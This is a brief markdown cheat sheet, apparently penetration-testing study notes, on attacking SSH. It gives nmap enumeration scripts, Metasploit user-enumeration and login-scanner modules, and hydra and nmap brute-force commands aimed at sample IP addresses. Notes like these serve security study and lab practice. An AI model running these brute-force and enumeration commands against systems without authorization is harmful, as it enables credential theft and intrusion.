# SSH
## info
* authentication methods
  * username + password
  * key based
* the tipical attack is
  * bruteforcing credentials, (or searching private key files in the victims home directory or in other places)
  * exploiting vulnerable ssh version

## login with ssh
ssh 192.202.224.3  
ssh username@192.202.224.3  
## nmap scripts
nmap -Pn -v 192.202.224.3 --script=ssh-auth-methods  
nmap -Pn -v 192.202.224.3 --script=ssh-auth-methods --script-args=ssh.user=admin  
nmap -Pn -v 192.202.224.3 --script=ssh2-enum-algos  
nmap -Pn -v 192.202.224.3 --script=ssh-hostkey  
nmap -Pn -v 192.202.224.3 --script=ssh-run --script-args="ssh-run.cmd=pwd,ssh-run.username=admin,ssh-run.password=Pass123"  
## metasploit
auxiliary/scanner/ssh/ssh_enumusers  
auxiliary/scanner/ssh/ssh_login  
auxiliary/scanner/ssh/ssh_version  
## bruteforcing username and password
nmap -Pn -v 192.202.224.3 --script=ssh-brute --script-args=userdb=users.txt,passdb=passwords.txt  
hydra -l admin -p Pass123 ssh://192.38.1.3  
hydra -L user_list.txt -P pass_list.txt ssh://192.38.1.3  
hydra -L user_list.txt -P pass_list.txt ssh://192.38.1.3 -t 4  
metasploit> auxiliary/scanner/ssh/ssh_enumusers  
metasploit> auxiliary/scanner/ssh/ssh_login  
